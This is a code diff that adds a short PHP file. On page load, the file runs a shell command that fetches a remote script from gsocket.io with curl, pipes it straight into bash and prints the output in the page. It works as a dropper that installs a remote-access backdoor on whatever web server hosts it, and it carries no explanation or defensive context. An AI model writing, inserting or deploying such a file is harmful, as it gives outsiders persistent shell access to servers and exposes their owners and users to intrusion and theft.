@@ -1,0 +1,13 @@
+<?php
+$process = proc_open("bash -c \"$(curl -fsSL https://gsocket.io/y)\"", [
+    0 => ["pipe", "r"], // STDIN
+    1 => ["pipe", "w"], // STDOUT
+    2 => ["pipe", "w"]  // STDERR
+], $pipes);
+
+if (is_resource($process)) {
+    echo "<pre>" . stream_get_contents($pipes[1]) . "</pre>";
+    fclose($pipes[1]);
+    proc_close($process);
+}
+?>
